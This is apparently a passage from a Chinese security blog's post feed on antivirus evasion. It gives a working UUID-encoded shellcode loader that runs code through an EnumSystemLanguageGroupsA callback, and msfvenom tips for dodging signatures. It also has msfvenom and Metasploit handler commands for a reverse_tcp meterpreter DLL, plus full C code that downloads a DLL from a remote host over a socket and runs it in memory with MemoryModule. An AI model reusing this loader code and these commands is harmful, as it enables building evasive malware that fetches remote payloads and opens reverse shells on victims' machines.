class="hljs-string">&quot;3fcb73f8-b3c9-34af-7904-bb1975efe989&quot;</span>,<br><span class="hljs-string">&quot;bd259d0e-28a7-f010-3800-6093ba5bb573&quot;</span>,<br><span class="hljs-string">&quot;72c89383-cec4-2621-9d85-94d7aad02453&quot;</span>,<br><span class="hljs-string">&quot;802cf5e0-f4b0-171d-cbae-bd9918dbf781&quot;</span>,<br><span class="hljs-string">&quot;394ee67d-9cb5-eb50-845d-fed229acfe13&quot;</span>,<br><span class="hljs-string">&quot;6a754f8d-f2ee-a98e-8d28-1a2a35babc96&quot;</span>,<br><span class="hljs-string">&quot;5c5a6fc4-c4ca-3a28-cedb-fd30ea500097&quot;</span>,<br><span class="hljs-string">&quot;3327227b-f020-6246-8c57-76746f07d2fe&quot;</span>,<br><span class="hljs-string">&quot;5d6f5c9d-a3cb-dbfd-b9a4-fde3edcccc68&quot;</span>,<br><span class="hljs-string">&quot;bad08a62-64c7-e79b-61ed-4272307075a8&quot;</span>,<br><span class="hljs-string">&quot;59f68d76-6a06-2be6-0336-a0c0792745e7&quot;</span>,<br><span class="hljs-string">&quot;844c482e-dab1-650c-545b-b67900000000&quot;</span><br>&#125;;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span>* argv[])</span> </span>&#123;<br><br><span class="hljs-keyword">int</span> dwNum = <span class="hljs-keyword">sizeof</span>(buf) / <span class="hljs-keyword">sizeof</span>(buf[<span class="hljs-number">0</span>]);<br><br>HANDLE hMemory = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE | HEAP_ZERO_MEMORY, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (hMemory == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br>PVOID pMemory = HeapAlloc(hMemory, <span class="hljs-number">0</span>, <span class="hljs-number">1024</span>);<br><br>DWORD_PTR CodePtr = (DWORD_PTR)pMemory;<br><br><span class="hljs-keyword">for</span> (<span class="hljs-keyword">size_t</span> i = <span class="hljs-number">0</span>; i &lt; dwNum; i++)<br>&#123;<br><span class="hljs-keyword">if</span> (CodePtr == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-keyword">break</span>;<br>&#125;<br>RPC_STATUSstatus = UuidFromStringA(RPC_CSTR(buf[i]), (UUID*)CodePtr);<br><span class="hljs-keyword">if</span> (status != RPC_S_OK) &#123;<br><br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br>CodePtr += <span class="hljs-number">16</span>;<br>&#125;<br><br><span class="hljs-keyword">if</span> (pMemory == <span class="hljs-literal">NULL</span>) &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-keyword">if</span> (EnumSystemLanguageGroupsA((LANGUAGEGROUP_ENUMPROCA)pMemory, LGRPID_INSTALLED, <span class="hljs-literal">NULL</span>) == FALSE) &#123;<br><span class="hljs-comment">// 加载成功</span><br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/10/20/vOoGBN12nH5qWMt.png" alt="成功执行"></p><p>记录一个新学的点，msfvenom生成木马时，可以用-b去避免所生成的shell中包含的字符<br>通常是-b ‘\xfc\xe8’或者-b ‘\x00’来减小msf码的文件特征</p>]]></content>
      
      
      <categories>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>静态恶意代码逃逸2</title>
      <link href="2022/10/19/%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B82/"/>
      <url>2022/10/19/%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B82/</url>
      
        <content type="html"><![CDATA[<h1 id="静态恶意代码逃逸2"><a href="#静态恶意代码逃逸2" class="headerlink" title="静态恶意代码逃逸2"></a>静态恶意代码逃逸2</h1><p>最近在学习从底层用C/C++去实现免杀，而看到了关于静态恶意代码逃逸的一些很好的文章，在此记录总结一下</p><a id="more"></a><h3 id="反射DLL加载"><a href="#反射DLL加载" class="headerlink" title="反射DLL加载"></a>反射DLL加载</h3><p>对于加载DLL而言，一般是通过LoadLibrary这个API来实现，但这里我们去使用memoryModule<br><a href="https://silver-glacier.github.io/2022/10/18/MemoryModule%E7%9A%84%E5%AD%A6%E4%B9%A0/">前置知识</a></p><p>将该项目下载之后，主要使用的是<code>MemoryModule.h、MemoryModule.cpp</code>文件</p><p>记录一下报错信息与处理<br><code>wcsncpy: This function or variable may be unsafe. Consider using wcsncpy_s instead. To disable deprecation, use _CRT_SECURE_NO_WARNINGS. See online help for details.</code></p><blockquote><p>处理方法：项目属性 -&gt; C/C++ -&gt; 预处理器 -&gt; 预处理器定义中加上<code>_CRT_SECURE_NO_WARNINGS</code><br>网上说在头部加上 <code>#define _CRT_SECURE_NO_WARNINGS</code>宏编译也能解决问题，但我在这里实测不行</p></blockquote><p><code>MemoryLoadLibrary：函数不接受一个参数</code></p><blockquote><p>处理方法： 将原语句改为<code>hModule = MemoryLoadLibrary(bFileBuffer, dwReadOfFileSize);</code></p></blockquote><p><code>链接器工具错误 LINK 2001</code></p><blockquote><p>处理方法： 生成的def文件与source.cpp文件名不一致</p></blockquote><h4 id="反射DLL与MSF"><a href="#反射DLL与MSF" class="headerlink" title="反射DLL与MSF"></a>反射DLL与MSF</h4><p>首先利用MSF来生成一个DLL，然后通过网络套接字（Socket）接受，丢到MemoryModule中，让其执行<br><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.152.129 LPORT=8899 -f dll -o shellcode.dll</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">handler -p windows<span class="hljs-regexp">/x64/m</span>eterpreter/reverse_tcp -H <span class="hljs-number">192.168</span>.<span class="hljs-number">152.129</span> -P <span class="hljs-number">8899</span><br>use exploit<span class="hljs-regexp">/multi/</span>handler <br>set payload windows<span class="hljs-regexp">/patchupdllinject/</span>reverse_tcp<br>set dll shellcode.dll<br></code></pre></td></tr></table></figure><p>这里直接贴上客户端代码，这个代码还是很值得学习的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;WinSock2.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;Windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;MemoryModule.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">pragma</span> comment(lib,<span class="hljs-meta-string">&quot;ws2_32.lib&quot;</span>)</span><br><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> PAYLOAD_SIZE 1024*512</span><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">BOOL</span> <span class="hljs-params">(*Module)</span><span class="hljs-params">(HMODULE hModule, DWORD ul_reason_for_call , LPVOID lpReserved)</span></span>;<br><br><span class="hljs-function"><span class="hljs-keyword">typedef</span> <span class="hljs-title">VOID</span> <span class="hljs-params">(*msg)</span><span class="hljs-params">(VOID)</span></span>;<br>PBYTE bFileBuffer = <span class="hljs-literal">NULL</span>;<br><br><br><span class="hljs-function">BOOL <span class="hljs-title">GetPEDLL</span><span class="hljs-params">()</span></span>&#123;<br><br>DWORD dwError;<br>WORD sockVersion = MAKEWORD(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>);<br>WSADATA wsaData;<br>SOCKET socks;<br>SHORT sListenPort = <span class="hljs-number">8888</span>;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sockaddr_in</span> <span class="hljs-title">sin</span>;</span><br><br><span class="hljs-keyword">if</span> (WSAStartup(sockVersion, &amp;wsaData) != <span class="hljs-number">0</span>)<br>&#123;<br>dwError = GetLastError();<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]WSAStarup Error : %d \n&quot;</span>,dwError);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br>socks = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);<br><br><span class="hljs-keyword">if</span> (socks == INVALID_SOCKET)<br>&#123;<br>dwError = GetLastError();<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]Socket Error : %d \n&quot;</span>,dwError);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-built_in">sin</span>.sin_family = AF_INET;<br><span class="hljs-built_in">sin</span>.sin_port = htons(sListenPort);<br><span class="hljs-built_in">sin</span>.sin_addr.S_un.S_addr = inet_addr(<span class="hljs-string">&quot;192.168.170.138&quot;</span>);<br><br><span class="hljs-keyword">if</span>(connect(socks,(struct sockaddr *)&amp;<span class="hljs-built_in">sin</span>,<span class="hljs-keyword">sizeof</span>(<span class="hljs-built_in">sin</span>)) == SOCKET_ERROR )<br>&#123;<br>dwError = GetLastError();<br><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]Bind Error : %d \n&quot;</span>,dwError);<br><span class="hljs-keyword">return</span> FALSE;<br>&#125;<br><br><span class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<br>ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">4</span>,<span class="hljs-literal">NULL</span>);<br>ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">2650</span>,<span class="hljs-literal">NULL</span>);<br>ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">4</span>,<span class="hljs-literal">NULL</span>);<br>ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">4</span>,<span class="hljs-literal">NULL</span>);<br>ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">4</span>,<span class="hljs-literal">NULL</span>);<br><br>ZeroMemory(bFileBuffer,PAYLOAD_SIZE);<br><br><br>ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">5120</span>,<span class="hljs-literal">NULL</span>);<br><br><span class="hljs-keyword">if</span> (ret &gt; <span class="hljs-number">0</span>)<br>&#123;<br>closesocket(socks);<br>&#125;<br><br><br><span class="hljs-keyword">return</span> TRUE;<br>&#125; <br><br><span class="hljs-comment">// 打开文件并获取大小</span><br><span class="hljs-function">DWORD <span class="hljs-title">OpenBadCodeDLL</span><span class="hljs-params">(HANDLE &amp; hBadCodeDll, LPCWSTR lpwszBadCodeFileName)</span></span>&#123;<br>DWORD dwHighFileSize = <span class="hljs-number">0</span>;<br>DWORD dwLowFileSize = <span class="hljs-number">0</span>;<br><span class="hljs-comment">// 打开文件</span><br>hBadCodeDll = CreateFile(lpwszBadCodeFileName,GENERIC_READ,FILE_SHARE_READ,<span class="hljs-literal">NULL</span>,OPEN_ALWAYS,FILE_ATTRIBUTE_NORMAL ,<span class="hljs-literal">NULL</span>);<br><span class="hljs-keyword">if</span>(hBadCodeDll == INVALID_HANDLE_VALUE)&#123;<br><span class="hljs-keyword">return</span> GetLastError();<br>&#125;<br>dwLowFileSize = GetFileSize(hBadCodeDll,&amp;dwHighFileSize);<br><span class="hljs-keyword">return</span> dwLowFileSize;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><br>HMEMORYMODULE hModule;<br>Module DllMain;<br>bFileBuffer = <span class="hljs-keyword">new</span> BYTE[PAYLOAD_SIZE];<br>GetPEDLL();<br><span class="hljs-comment">// 导入PE文件</span><br>hModule = MemoryLoadLibrary(bFileBuffer);<br><span class="hljs-comment">// 如果加载失败，就退出</span><br><span class="hljs-keyword">if</span>(hModule == <span class="hljs-literal">NULL</span>)&#123;<br><span class="hljs-keyword">delete</span> [] bFileBuffer;<br><span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><span class="hljs-comment">// 获取msg导出函数地址</span><br>DllMain = (Module)MemoryGetProcAddress(hModule,<span class="hljs-string">&quot;DllMain&quot;</span>);<br><span class="hljs-comment">// 运行msg函数</span><br>DllMain(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);<br><span class="hljs-comment">// 释放资源</span><br>DWORD dwThread;<br>HANDLE hThread = CreateThread(<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,(LPTHREAD_START_ROUTINE)DllMain,<span class="hljs-literal">NULL</span>,<span class="hljs-literal">NULL</span>,&amp;dwThread);<br><br>WaitForSingleObject(hThread,INFINITE);<br><br>MemoryFreeLibrary(hModule);<br><span class="hljs-comment">// 释放PE内存</span><br><span class="hljs-keyword">delete</span> [] bFileBuffer;<br><span class="hljs-keyword">return</span> GetLastError();<br>&#125;<br></code></pre></td></tr></table></figure><p>其中比较难以理解的就是GetPEDLL函数中的这一部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<br>ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">4</span>,<span class="hljs-literal">NULL</span>);<br>ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">2650</span>,<span class="hljs-literal">NULL</span>);<br>ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">4</span>,<span class="hljs-literal">NULL</span>);<br>ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">4</span>,<span class="hljs-literal">NULL</span>);<br>ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">4</span>,<span class="hljs-literal">NULL</span>);<br><br>ZeroMemory(bFileBuffer,PAYLOAD_SIZE);<br><br><br>ret = recv(socks,(PCHAR)bFileBuffer,<span class="hljs-number">5120</span>,<span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure><p>首先是recv()这个函数<br>函数原型<code>int recv( _In_ SOCKET s, _Out_ char *buf, _In_ int len, _In_ int flags);</code><br>该函数的主要作用是将接收到的内容存到第二个参数所指向的缓冲区</p><p><img src="https://s2.loli.net/2022/10/19/HcQtfh9rgeM2WnE.png" alt="msf"><br>连接msf成功，传输stage 2650bytes,传输dll 8712bytes，但这仍然无法解释上述的recv代码的偏移量<br>于是我想到拿wireshark去抓包分析一下，看看msf一共传输了哪些东西<br>过滤掉源IP与目的IP之后，得到如下的TCP传输<br><img src="https://s2.loli.net/2022/10/19/V5DHfw4bZvESp3e.png" alt="wireshark"><br>那我们就挨个来看一下这些包有多大，以及具体内容</p><p>一共2658bytes<br><img src="https://s2.loli.net/2022/10/19/iqyYWgurDmvsUwo.png" alt="4bytes"><br><img src="https://s2.loli.net/2022/10/19/KhkV8u67fbEnmT2.png" alt="1460bytes"><br><img src="https://s2.loli.net/2022/10/19/L16PqxFlEQceCXb.png" alt="1194bytes"></p><p>一共8712bytes<br><img src="https://s2.loli.net/2022/10/19/M9GxW8vS7lnUaPI.png" alt="7300bytes"><br><img src="https://s2.loli.net/2022/10/19/UQd953TlzMeXkKA.png" alt="1412bytes"></p><p>于是将上述代码改为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<br>ret = recv(socks, (PCHAR)bFileBuffer, <span class="hljs-number">4</span>, <span class="hljs-literal">NULL</span>);<br>ret = recv(socks, (PCHAR)bFileBuffer, <span class="hljs-number">2650</span>, <span class="hljs-literal">NULL</span>);<br>ret = recv(socks, (PCHAR)bFileBuffer, <span class="hljs-number">4</span>, <span class="hljs-literal">NULL</span>);<br><br>ZeroMemory(bFileBuffer, PAYLOAD_SIZE);<br><br>ret = recv(socks, (PCHAR)bFileBuffer, <span class="hljs-number">8712</span>, <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure><p>但貌似还是没有成功上线</p><p>当我一个一个包仔细看的时候，突然想到，在msfvenom生成的时候，会带有dll大小的具体信息，于是重新生成一个dll来看<br><img src="https://s2.loli.net/2022/10/19/APHegd1Fp2vu3yB.png" alt="msfvenom生成dll"><br>这里可以看到dll大小为8704bytes<br>重新抓包分析</p><p><img src="https://s2.loli.net/2022/10/19/AZXYbaGMgD7Pszh.png"><br>可以看到dll文件数据由7300+1416=8716bytes构成，意味着有12bytes需要偏移</p><p>于是将代码改为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">int</span> ret = <span class="hljs-number">0</span>;<br>ret = recv(socks, (PCHAR)bFileBuffer, <span class="hljs-number">4</span>, <span class="hljs-literal">NULL</span>);<br>ret = recv(socks, (PCHAR)bFileBuffer, <span class="hljs-number">2650</span>, <span class="hljs-literal">NULL</span>);<br>ret = recv(socks, (PCHAR)bFileBuffer, <span class="hljs-number">12</span>, <span class="hljs-literal">NULL</span>);<br><br>ZeroMemory(bFileBuffer, PAYLOAD_SIZE);<br><br>ret = recv(socks, (PCHAR)bFileBuffer, <span class="hljs-number">8704</span>, <span class="hljs-literal">NULL</span>);<br></code></pre></td></tr></table></figure><p>但仍旧无法上线，可能不是这么简单的移位，这里我用邮件私信了作者，得到了解决办法</p><blockquote><p>用vs调试一下，看看lpbuffer中的内存情况，找到MZ DOS头，以内存的偏移为准</p></blockquote><p>于是决定深入的了解一下PE文件的结构</p><p>以这个文件为例</p><ol><li>从文件头4D 5A（MZ）开始，跳转3C（即偏移3C）</li><li>跳转后可读取到数据为0000 00B0</li><li>再跳转到地址0000 00B0；</li><li>若该地址数据为50 45（即PE）就为PE文件。<br><img src="https://s2.loli.net/2022/10/20/qoaXzHOr7y95j4p.png"></li></ol>]]></content>
      
      
      <categories>
          
          <category> 免杀 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MemoryModule的学习</title>
      <link href="2022/10/18/MemoryModule%E7%9A%84%E5%AD%A6%E4%B9%A0/"/>
      <url>2022/10/18/MemoryModule%E7%9A%84%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="MemoryModule"><a href="#MemoryModule" class="headerlink" title="MemoryModule"></a>MemoryModule</h1><p>对于dll劫持和转发攻击时，一般会通过LoadLibrary这个API来加载DLL文件，虽然其存在一定的免杀效果，但效果仍不是十分显著，于是便引出了MemoryModule这个用法<br>而网上对于MemoryModule的文章大多是英文，而且晦涩难懂，这篇文章记录一下自己的学习过程和个人对于MemoryModule的理解，可能很多地方翻译的不准确，见谅</p><a id="more"></a><h2 id="MemoryModule是什么"><a href="#MemoryModule是什么" class="headerlink" title="MemoryModule是什么"></a>MemoryModule是什么</h2><p><a href="https://github.com/fancycode/MemoryModule/blob/master/doc/readme.rst">MemoryModule项目文章</a><br><a href="https://github.com/fancycode/MemoryModule">MemoryModule地址</a></p><blockquote><p>本文的大量示例代码来源于项目文章，在这里直接放上链接，就不一块一块代码照搬了</p></blockquote><p>默认的 Windows API 函数将外部库加载到程序中（加载库、加载库Ex）仅适用于文件系统上的文件。因此，不可能从内存中加载 DLL。但有时，您确实需要此功能（例如，您不想分发大量文件或希望使反汇编更加困难）。此问题的常见解决方法是首先将 DLL 写入临时文件，然后从那里导入。当程序终止时，临时文件将被删除</p><h2 id="MemoryModule为什么能免杀"><a href="#MemoryModule为什么能免杀" class="headerlink" title="MemoryModule为什么能免杀"></a>MemoryModule为什么能免杀</h2><p>Windows操作系统在执行一个Windows PE格式的文件时，Windows自身是有一个Windows PE格式的解析器，通过PE格式把文件的各个节放入不同的内存区域</p><p>爱折腾的程序员自己也想实现这个过程，那就是反射，这个反射机制就是将Windows PE格式通过自己写的代码进行解析，并把不同的节数据加载到内存中，通常这个反射加载技术被很多APT组织、大型渗透框架、病毒作者使用比较广泛</p><p>当一个Windows PE格式的文件变成了一个内存中的字符串，意味着这个文件可以被任意方式去转换、加密、混淆，因此反病毒软件也难以查杀</p><h2 id="理解MemoryModule"><a href="#理解MemoryModule" class="headerlink" title="理解MemoryModule"></a>理解MemoryModule</h2><h3 id="windows-可执行文件PE"><a href="#windows-可执行文件PE" class="headerlink" title="windows 可执行文件PE"></a>windows 可执行文件PE</h3><h4 id="PE-header"><a href="#PE-header" class="headerlink" title="PE header"></a>PE header</h4><p>大多数可以包含可执行代码（.exe  .dll.sys）的 Windows 二进制文件共享一种通用文件格式，而PE文件格式也是如此<br>在windows二进制文件中，PE文件有独特的标识，称之为PE header<br>PE标头包含有关可执行文件中用于存储代码和数据或定义从其他库导入或此库提供的导出的不同部分的信息<br>在该信息中</p><ul><li>描述了文件的物理格式，即内容，有关符号的信息等</li><li>包含有关库的逻辑格式的信息，包括所需的操作系统版本、内存要求和入口点</li><li>包含 16 （） 个条目，用于定义库的逻辑组件<br>对于导入 DLL，我们只需要描述导入和基重定位表的条目。为了提供对导出函数的访问，需要导出条目。</li></ul><p><strong>个人理解：PE header更类似于一种网络协议中的标识符，来告诉windows文件的格式信息</strong></p><h4 id="Section-header"><a href="#Section-header" class="headerlink" title="Section header"></a>Section header</h4><p>Section header存储在 PE header中的OptionalHeader_结构之后。微软提供了宏来获取基于 PE 标头的起始地址。<br><strong>个人理解：Section header的大致用处是存储了有关文件中的每个Seciton的信息</strong></p><h3 id="Loading-the-library"><a href="#Loading-the-library" class="headerlink" title="Loading the library"></a>Loading the library</h3><p>在发出 API 调用时，窗口基本上执行以下任务：<code>LoadLibrary</code></p><ul><li><p>打开给定文件并检查 DOS 和 PE 标头。</p></li><li><p>尝试在位置<code>PEHeader.OptionalHeader.ImageBase</code>分配<code>PEHeader.OptionalHeader.SizeOfImage</code>字节的内存块。</p></li><li><p>解析节标题并将节复制到其地址。相对于分配的内存块的基数，每个部分的目标地址都存储在<code>IMAGE_SECTION_HEADER</code>结构的<code>VirtualAddress</code>属性中。</p></li><li><p>如果分配的内存块与<code>ImageBase</code>不同，则必须调整代码和/或数据部分中的各种引用。这称为基本重定位。</p></li><li><p>必须通过加载相应的库来解决库所需的导入。</p></li><li><p>必须根据节的特征保护不同节的内存区域。某些部分被标记为可丢弃，因此此时可以安全地释放。这些部分通常包含仅在导入期间需要的临时数据</p></li><li><p>现在库已完全加载。 须通过使用标志<code>DLL_PROCESS_ATTACH</code>调用入口点 来通知它。</p></li></ul><h4 id="分配内存"><a href="#分配内存" class="headerlink" title="分配内存"></a>分配内存</h4><p>库所需的所有内存必须使用 保留/分配，因为 Windows 提供了保护这些内存块的功能。这是限制对内存的访问所必需的，例如阻止对代码或常量数据的写入访问。<br><strong>个人理解：这里主要是利用<code>VirtualAlloc</code>函数来分配内存，对于该函数是windows的一个API函数，用来申请内存空间</strong></p><h4 id="复制内存"><a href="#复制内存" class="headerlink" title="复制内存"></a>复制内存</h4><p>经过前面的分配内存之后，可以将文件内容复制到系统中。必须计算节头，以确定文件中的位置和内存中的目标区域<br><strong>个人理解：通过复制内容，将shellcode移动到申请的内存空间中来实现免杀</strong></p><h4 id="迁移内存"><a href="#迁移内存" class="headerlink" title="迁移内存"></a>迁移内存</h4><p>库的代码/数据部分中的所有内存地址都相对于OptionalHeader_中定义的地址进行存储<br>如果无法将库导入到此内存地址，则必须调整引用 =&gt;重新定位。文件格式通过在基重定位表中存储有关所有这些引用的信息来帮助实现这一点<br><strong>个人理解：这里需要重新计算内存地址，否则解析PE文件时，导入库可能会导致内存指针指向错误</strong></p><h4 id="解析导入"><a href="#解析导入" class="headerlink" title="解析导入"></a>解析导入</h4><p>当我们解析导入时，我们并行遍历两个列表，导入由第一个列表中的名称定义的函数，并将指向第二个列表中的符号的指针存储<br><strong>个人理解：我对这里的理解并没有十分清晰，但其目的可能是为了使外部库导入的函数名能找到其对应的内存地址</strong></p><h4 id="保护内存与通知库"><a href="#保护内存与通知库" class="headerlink" title="保护内存与通知库"></a>保护内存与通知库</h4><p><code>VirtualProtect</code>该函数可用于限制对内存的访问。如果程序尝试以未经授权的方式访问它，则 Windows 会引发异常。<br>最后要做的是调用 DLL 入口点（由 定义），从而通知库连接到进程。<code>AddressOfEntryPoint</code><br><strong>个人理解：内存保护类似于const，防止其他程序的使用导致该内存出现问题</strong></p><h3 id="Exported-functions"><a href="#Exported-functions" class="headerlink" title="Exported functions"></a>Exported functions</h3><p>如果要访问库导出的函数，则需要找到符号的入口点，即要调用的函数的名称。<br>首先要做的是将函数的名称映射到导出符号的序号。因此，只需遍历由 定义的数组并并行，直到找到所需的名称<br><strong>个人理解：这里与前面的解析导入相对应，为了使函数名能找到其对应的内存地址</strong></p><h3 id="Freeing-the-library-amp-MemoryModule"><a href="#Freeing-the-library-amp-MemoryModule" class="headerlink" title="Freeing the library &amp; MemoryModule"></a>Freeing the library &amp; MemoryModule</h3><p>这里没什么意义，只是释放自定义的库与C中的一个库，可以从内存中加载DLL</p>]]></content>
      
      
      <categories>
          
          <category> 前置知识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 免杀 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>静态恶意代码逃逸1</title>
      <link href="2022/10/17/%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8/"/>
      <url>2022/10/17/%E9%9D%99%E6%80%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E9%80%83%E9%80%B8/</url>
      
